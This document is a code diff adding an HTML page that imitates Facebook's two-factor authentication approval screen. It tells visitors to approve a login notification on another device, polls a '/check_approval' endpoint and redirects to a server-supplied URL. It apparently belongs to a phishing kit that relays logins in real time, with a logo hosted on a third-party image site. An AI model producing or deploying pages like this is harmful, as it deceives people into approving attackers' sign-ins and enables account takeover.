@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Two-Factor Authentication</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #011017; /* Background color */
+            margin: 0;
+        }
+        .auth-container {
+            text-align: center; /* Center the main content */
+            background: rgba(255, 255, 255, 0.0); /* Fully transparent background */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 350px; /* Adjust width as needed */
+            position: relative;
+            z-index: 1; /* Ensure it's above other content */
+        }
+        .auth-container img {
+            width: 350px; /* Slightly increased width */
+            margin-bottom: 20px;
+            display: block; /* Center the image */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .auth-container h2 {
+            margin-bottom: 15px;
+            color: white;
+            font-size: 24px; /* Increased font size */
+            font-weight: bold; /* Make font bold */
+        }
+        .auth-container p {
+            margin-bottom: 20px;
+            color: white;
+            font-size: 16px;
+            text-align: left; /* Align text to the left */
+        }
+        .auth-container .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px; /* Size of the spinner */
+            height: 50px; /* Size of the spinner */
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .auth-container .message {
+            font-size: 16px;
+            color: white;
+            background: rgba(255, 255, 255, 0.0); /* Fully transparent background */
+            border: 2px solid white; /* White border */
+            border-radius: 10px;
+            padding: 10px;
+            width: fit-content;
+            margin: 20px auto; /* Center the message */
+            text-align: center;
+        }
+    </style>
+    <script>
+        function checkApproval() {
+            fetch('/check_approval')
+                .then(response => response.json())
+                .then(data => {
+                    if (data === "pending") {
+                        setTimeout(checkApproval, 1000);  // Check again after 1 second
+                    } else {
+                        window.location.href = data;  // Redirect to the approved URL
+                    }
+                });
+        }
+
+        window.onload = checkApproval;  // Start checking as soon as the page loads
+    </script>
+</head>
+<body>
+    <div class="auth-container">
+        <img src="https://www.upload.ee/image/16962878/1723493928144.png" alt="Logo">
+        <h2>Two-Factor Authentication</h2>
+        <p>Check your notifications on another device</p>
+        <p>Go to your Facebook account on another device and open the notification we sent to approve this login.</p>
+        <div class="spinner"></div>
+        <p class="message">Waiting for approval...</p>
+    </div>
+</body>
+</html>
